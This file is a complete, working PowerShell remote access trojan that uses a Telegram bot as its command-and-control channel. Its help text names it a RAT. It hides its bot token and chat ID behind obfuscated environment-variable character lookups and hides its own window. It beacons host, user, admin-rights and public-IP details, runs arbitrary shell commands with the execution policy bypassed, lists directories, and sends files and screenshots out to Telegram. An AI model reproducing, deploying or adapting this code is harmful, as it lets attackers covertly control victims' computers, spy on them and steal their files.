$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'

& (($env:CommonProgramFiles[12], $env:PUBLIC[5], $env:ComSpec[25]) -join '') (([char]36, [char]66, $env:PSModulePath[131], $env:PSModulePath[117], [char]84, $env:ProgramData[5], $env:PSModulePath[11], $env:ComSpec[24], $env:CommonProgramFiles[22], $env:ProgramW6432[10], [char]61, $env:ProgramFiles[10], [char]34, [char]56, $env:ComSpec[18], [char]52, $env:PSModulePath[120], [char]56, [char]54, [char]53, $env:ComSpec[18], $env:PSModulePath[120], [char]54, $env:ProgramData[1], [char]65, [char]65, [char]72, [char]53, [char]76, $env:ComSpec[3], [char]76, [char]71, [char]76, [char]66, $env:PSModulePath[120], $env:ProgramW6432[13], [char]74, [char]72, $env:PSModulePath[146], $env:ProgramW6432[8], [char]53, $env:ComSpec[18], $env:PUBLIC[14], $env:CommonProgramW6432[8], $env:ComSpec[18], [char]66, [char]54, $env:SystemRoot[9], $env:PUBLIC[5], [char]76, $env:PSModulePath[63], [char]76, $env:PUBLIC[10], $env:ComSpec[17], [char]74, [char]69, [char]113, $env:SystemRoot[0], $env:PSModulePath[11], [char]34) -join '')
& (($env:ProgramFiles[12], $env:ProgramW6432[14], $env:ComSpec[25]) -join '') (([char]36, $env:ProgramFiles[0], $env:PSModulePath[47], $env:CommonProgramFiles[8], $env:ProgramData[12], $env:PSModulePath[107], $env:windir[6], $env:CommonProgramFiles[23], [char]61, $env:ProgramFiles[10], [char]34, [char]55, [char]52, [char]55, $env:PSModulePath[144], [char]55, [char]55, [char]52, $env:PSModulePath[144], $env:ComSpec[17], [char]53, [char]34) -join '')

$MaxRetries = 5
$BaseDelay = 10
$CommandCheckInterval = 7
$JitterFactor = 0.3
$CommandTimeout = 30
$MaxOutputLength = 3900

$ConsecutiveErrors = 0
$MaxConsecutiveErrors = 10
$CurrentProcess = $null
$StopRequested = $false
$CurrentDirectory = Get-Location

function Test-UserAuthorized {
    param($MessageChatID)
    return ($MessageChatID -eq $ChatID)
}

function Get-JitteredDelay {
    param ($BaseDelay)
    $Jitter = $BaseDelay * $JitterFactor * (Get-Random -Minimum -1.0 -Maximum 1.0)
    $JitteredDelay = $BaseDelay + $Jitter
    return [math]::Max(1, $JitteredDelay)
}

function Send-TelegramMessage {
    param(
        [string]$Message,
        [int]$RetryCount = 0
    )

    if ([string]::IsNullOrEmpty($BotToken) -or [string]::IsNullOrEmpty($ChatID)) {
        return $null
    }

    # Truncate message if too long
    if ($Message.Length -gt $MaxOutputLength) {
        $Message = $Message.Substring(0, $MaxOutputLength) + "`n[...] Output truncated"
    }

    $Uri = "https://api.telegram.org/bot$BotToken/sendMessage"
    $Body = @{
        chat_id = $ChatID
        text = $Message
        disable_web_page_preview = "true"
    }

    try {
        $Response = Invoke-RestMethod -Uri $Uri -Method Post -Body $Body -ContentType "application/x-www-form-urlencoded" -TimeoutSec 15 -ErrorAction Stop
        $Script:ConsecutiveErrors = 0
        return $Response
    }
    catch {
        if ($RetryCount -lt $MaxRetries) {
            $Delay = Get-JitteredDelay -BaseDelay ($BaseDelay * [math]::Pow(2, $RetryCount))
            Start-Sleep -Seconds $Delay
            return Send-TelegramMessage -Message $Message -RetryCount ($RetryCount + 1)
        }
        else {
            $Script:ConsecutiveErrors++
            return $null
        }
    }
}

function Send-TelegramFile {
    param(
        [string]$FilePath,
        [string]$Caption = ""
    )

    if (-not (Test-Path $FilePath)) {
        return "File not found: $FilePath"
    }

    $Uri = "https://api.telegram.org/bot$BotToken/sendDocument"
    
    try {
        $Boundary = [System.Guid]::NewGuid().ToString()
        $FileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $FileName = [System.IO.Path]::GetFileName($FilePath)
        
        $Encoding = [System.Text.Encoding]::UTF8
        $Stream = New-Object System.IO.MemoryStream
        
        $Parts = @(
            @{ Name = "chat_id"; Value = $ChatID },
            @{ Name = "caption"; Value = $Caption }
        )
        
        foreach ($Part in $Parts) {
            if (-not [string]::IsNullOrEmpty($Part.Value)) {
                $PartData = $Encoding.GetBytes("--$Boundary`r`nContent-Disposition: form-data; name=`"$($Part.Name)`"`r`n`r`n$($Part.Value)`r`n")
                $Stream.Write($PartData, 0, $PartData.Length)
            }
        }
        
        $FileHeader = $Encoding.GetBytes("--$Boundary`r`nContent-Disposition: form-data; name=`"document`"; filename=`"$FileName`"`r`nContent-Type: application/octet-stream`r`n`r`n")
        $Stream.Write($FileHeader, 0, $FileHeader.Length)
        $Stream.Write($FileBytes, 0, $FileBytes.Length)
        
        $Closing = $Encoding.GetBytes("`r`n--$Boundary--`r`n")
        $Stream.Write($Closing, 0, $Closing.Length)
        
        $Stream.Position = 0
        
        $Headers = @{
            "Content-Type" = "multipart/form-data; boundary=$Boundary"
        }

        $Response = Invoke-RestMethod -Uri $Uri -Method Post -Body $Stream -Headers $Headers -ErrorAction Stop
        return "File sent successfully: $FilePath"
    }
    catch {
        return "Error sending file: $($_.Exception.Message)"
    }
    finally {
        if ($Stream) { $Stream.Dispose() }
    }
}

function Get-TelegramCommands {
    param(
        [int]$Offset = 0,
        [int]$RetryCount = 0
    )

    if ([string]::IsNullOrEmpty($BotToken) -or [string]::IsNullOrEmpty($ChatID)) {
        return @{ Commands = @(); NextOffset = $Offset }
    }

    $Uri = "https://api.telegram.org/bot$BotToken/getUpdates?offset=$Offset&timeout=25"

    try {
        $Response = Invoke-RestMethod -Uri $Uri -Method Get -ErrorAction Stop -TimeoutSec 30
        $Script:ConsecutiveErrors = 0

        if ($Response.ok -and $Response.result) {
            $LastUpdateID = 0
            $Commands = @()

            foreach ($Update in $Response.result) {
                $LastUpdateID = $Update.update_id
                if ($Update.message -and (Test-UserAuthorized $Update.message.chat.id) -and $Update.message.text -match "^\/") {
                    $Commands += @{
                        UpdateID = $Update.update_id
                        Command = $Update.message.text.Trim()
                        MessageID = $Update.message.message_id
                        ChatID = $Update.message.chat.id
                    }
                }
            }
            
            return @{
                Commands = $Commands
                NextOffset = if ($LastUpdateID -gt 0) { $LastUpdateID + 1 } else { $Offset }
            }
        }
        return @{ Commands = @(); NextOffset = $Offset }
    }
    catch {
        if ($RetryCount -lt $MaxRetries) {
            $Delay = Get-JitteredDelay -BaseDelay ($BaseDelay * [math]::Pow(2, $RetryCount))
            Start-Sleep -Seconds $Delay
            return Get-TelegramCommands -Offset $Offset -RetryCount ($RetryCount + 1)
        }
        else {
            $Script:ConsecutiveErrors++
            return @{ Commands = @(); NextOffset = $Offset }
        }
    }
}

function Invoke-CommandSafe {
    param([string]$Command)

    $script:StopRequested = $false

    try {
        $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
        $ProcessInfo.FileName = "powershell.exe"
        $ProcessInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"$Command 2>&1 | Out-String`""
        $ProcessInfo.RedirectStandardOutput = $true
        $ProcessInfo.RedirectStandardError = $true
        $ProcessInfo.UseShellExecute = $false
        $ProcessInfo.CreateNoWindow = $true
        $ProcessInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden

        $Process = New-Object System.Diagnostics.Process
        $Process.StartInfo = $ProcessInfo
        $script:CurrentProcess = $Process
        
        $Process.Start() | Out-Null
        $Output = ""
        $StartTime = Get-Date
        
        while (-not $Process.HasExited -and -not $script:StopRequested) {
            if (((Get-Date) - $StartTime).TotalSeconds -gt $CommandTimeout) {
                $Process.Kill()
                $Output += "`n[!] Command timed out after $CommandTimeout seconds"
                break
            }
            
            $Output += $Process.StandardOutput.ReadToEnd()
            Start-Sleep -Milliseconds 100
            
            if ($script:StopRequested) {
                $Process.Kill()
                $Output += "`n[!] Command stopped by user request"
                break
            }
        }

        $Output += $Process.StandardOutput.ReadToEnd()
        $ErrorOutput = $Process.StandardError.ReadToEnd()
        if ($ErrorOutput) {
            $Output += "`n[ERROR] $ErrorOutput"
        }

        $Output = $Output.Trim()
        if ([string]::IsNullOrEmpty($Output)) {
            $Output = "Command executed successfully (no output)"
        }

        $script:CurrentProcess = $null
        return $Output
    }
    catch {
        $script:CurrentProcess = $null
        return "Error executing command: $($_.Exception.Message)"
    }
}

function Get-SystemBeacon {
    try {
        $OS = Get-WmiObject -Class Win32_OperatingSystem -ErrorAction Stop
        $Computer = Get-WmiObject -Class Win32_ComputerSystem -ErrorAction Stop
        $CPU = Get-WmiObject -Class Win32_Processor -ErrorAction Stop | Select-Object -First 1
        $Memory = Get-WmiObject -Class Win32_OperatingSystem -ErrorAction Stop
        $Network = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction Stop | Where-Object { $_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1
        
        $TotalMemoryGB = [math]::Round($Memory.TotalVisibleMemorySize / 1MB, 2)
        $FreeMemoryGB = [math]::Round($Memory.FreePhysicalMemory / 1MB, 2)
        $UsedMemoryGB = $TotalMemoryGB - $FreeMemoryGB
        $UsedMemoryPercent = [math]::Round(($UsedMemoryGB / $TotalMemoryGB) * 100, 2)
        
        $Admin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
        
        $BeaconMessage = @"
SYSTEM BEACON - $env:COMPUTERNAME

SYSTEM INFO:
- OS: $($OS.Caption)
- Version: $($OS.Version)
- Architecture: $(if ($env:PROCESSOR_ARCHITECTURE -eq "AMD64") { "64-bit" } else { "32-bit" })
- Hostname: $env:COMPUTERNAME
- Domain: $env:USERDOMAIN
- User: $env:USERNAME
- Admin: $(if ($Admin) { "Yes" } else { "No" })

HARDWARE:
- CPU: $($CPU.Name)
- Cores: $($CPU.NumberOfCores)
- RAM: $UsedMemoryPercent% used ($UsedMemoryGB GB / $TotalMemoryGB GB)
- Manufacturer: $($Computer.Manufacturer)
- Model: $($Computer.Model)

NETWORK:
- IP: $($Network.IPAddress)
- Interface: $($Network.InterfaceAlias)
- Public IP: $(try { (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5) } catch { "Unknown" })

STATUS:
- Uptime: $([math]::Round($OS.ConvertToDateTime($OS.LastBootUpTime).ToLocalTime().Subtract((Get-Date)).TotalHours * -1, 2)) hours
- Time: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
- Language: $((Get-Culture).Name)

LOCATION:
- Timezone: $((Get-TimeZone).DisplayName)
- Country: $(try { (Get-Culture).DisplayName } catch { "Unknown" })
"@

        return $BeaconMessage
    }
    catch {
        return "Beacon Error: $($_.Exception.Message)"
    }
}

function Get-DirectoryContents {
    param($Path)
    
    if (-not $Path) { $Path = $CurrentDirectory.Path }
    
    try {
        if (Test-Path $Path) {
            if ((Get-Item $Path) -is [System.IO.DirectoryInfo]) {
                $Items = Get-ChildItem $Path | ForEach-Object { 
                    $Type = if ($_.PSIsContainer) { "[DIR]" } else { "[FILE]" }
                    "$Type $($_.Name) ($([math]::Round($_.Length/1KB, 2)) KB)"
                }
                return "Contents of $Path :`n`n" + ($Items -join "`n")
            } else {
                return "Error: Path is not a directory"
            }
        } else {
            return "Error: Path does not exist"
        }
    }
    catch {
        return "Error: $($_.Exception.Message)"
    }
}

function Set-CurrentDirectory {
    param($Path)
    
    try {
        if (Test-Path $Path) {
            Set-Location $Path
            $script:CurrentDirectory = Get-Location
            return "Changed directory to: $($CurrentDirectory.Path)"
        } else {
            return "Error: Path does not exist"
        }
    }
    catch {
        return "Error: $($_.Exception.Message)"
    }
}

function Invoke-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $Screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $Bounds = $Screen.Bounds
        $Bitmap = New-Object System.Drawing.Bitmap $Bounds.Width, $Bounds.Height
        $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
        $Graphics.CopyFromScreen($Bounds.Location, [System.Drawing.Point]::Empty, $Bounds.Size)
        
        $FilePath = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        $Bitmap.Save($FilePath, [System.Drawing.Imaging.ImageFormat]::Png)
        
        $Graphics.Dispose()
        $Bitmap.Dispose()
        
        # Send the file
        $result = Send-TelegramFile -FilePath $FilePath -Caption "Screenshot from $env:COMPUTERNAME"
        
        # Clean up
        Remove-Item $FilePath -Force -ErrorAction SilentlyContinue
        
        return $result
    }
    catch {
        return "Screenshot Error: $($_.Exception.Message)"
    }
}

function Process-Command {
    param($Command, $ChatID)
    
    if (-not (Test-UserAuthorized $ChatID)) {
        return "Unauthorized access attempt"
    }
    
    $CommandParts = $Command -split " "
    $BaseCommand = $CommandParts[0].ToLower()
    $Arguments = $CommandParts[1..($CommandParts.Length-1)] -join " "
    
    switch -wildcard ($BaseCommand) {
        "/help" {
            return @"
RAT COMMANDS:

BASIC:
/help - Lists all commands
/ping - Test connection
/beacon - Get system information
/delme - Delete WinConf.txt from TEMP

FILE OPERATIONS:
/ls [path] - Lists directory contents
/cd [path] - Changes directory
/download [file_path] - Downloads file

SYSTEM:
/cmd [command] - Executes command in shell

SCREENSHOT:
/screenshot - Takes screenshot of all monitors
"@
        }
        
        "/ping" {
            return "Pong! Agent is active on $env:COMPUTERNAME"
        }
        
        "/beacon" {
            return Get-SystemBeacon
        }
        
        "/delme" {
            $filePath = "$env:TEMP\WinConf.txt"
            if (Test-Path $filePath) {
                try {
                    Remove-Item $filePath -Force -ErrorAction Stop
                    return "File deleted successfully: $filePath"
                }
                catch {
                    return "Error deleting file: $($_.Exception.Message)"
                }
            } else {
                return "File not found: $filePath"
            }
        }
        
        "/ls" {
            return Get-DirectoryContents $Arguments
        }
        
        "/cd" {
            if (-not $Arguments) { return "Usage: /cd [path]" }
            return Set-CurrentDirectory $Arguments
        }
        
        "/download" {
            if (-not $Arguments) { return "Usage: /download [file_path]" }
            if (Test-Path $Arguments) {
                $result = Send-TelegramFile -FilePath $Arguments -Caption "File from $env:COMPUTERNAME"
                return $result
            } else {
                return "File not found: $Arguments"
            }
        }
        
        "/screenshot" {
            return Invoke-Screenshot
        }
        
        "/screen" {
            return Invoke-Screenshot
        }
        
        "/cmd" {
            if (-not $Arguments) { return "Usage: /cmd [command]" }
            return Invoke-CommandSafe $Arguments
        }
        
        default {
            return "Unknown command: $BaseCommand. Type /help for available commands."
        }
    }
}

function Start-C2Loop {
    if ([string]::IsNullOrEmpty($BotToken) -or [string]::IsNullOrEmpty($ChatID)) {
        return
    }
    
    try {
        $beacon = Get-SystemBeacon
        Send-TelegramMessage -Message $beacon | Out-Null
    }
    catch {
    }
    
    $UpdateOffset = 0
    $LoopCount = 0
    $LastBeaconTime = Get-Date

    while ($true) {
        $LoopCount++

        try {
            if (((Get-Date) - $LastBeaconTime).TotalHours -ge 1) {
                $beacon = Get-SystemBeacon
                Send-TelegramMessage -Message $beacon | Out-Null
                $LastBeaconTime = Get-Date
            }

            $UpdateData = Get-TelegramCommands -Offset $UpdateOffset
            $UpdateOffset = $UpdateData.NextOffset

            foreach ($Cmd in $UpdateData.Commands) {
                try {
                    $Result = Process-Command -Command $Cmd.Command -ChatID $Cmd.ChatID
                    Send-TelegramMessage -Message $Result | Out-Null
                }
                catch {
                    Send-TelegramMessage -Message "Error processing command: $($_.Exception.Message)" | Out-Null
                }
            }

            if ($Script:ConsecutiveErrors -ge $MaxConsecutiveErrors) {
                exit 1
            }

            $SleepTime = Get-JitteredDelay -BaseDelay $CommandCheckInterval
            Start-Sleep -Seconds $SleepTime
        }
        catch {
            $Script:ConsecutiveErrors++
            Start-Sleep -Seconds (Get-JitteredDelay -BaseDelay 30)
        }
    }
}

try {
    if ($Host.Name -eq "ConsoleHost") {
        $windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
        $windowAsync = Add-Type -MemberDefinition $windowCode -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
        $windowAsync::ShowWindow((Get-Process -PID $pid).MainWindowHandle, 0) | Out-Null
    }
    
    Start-C2Loop
}
catch {
    exit 1
}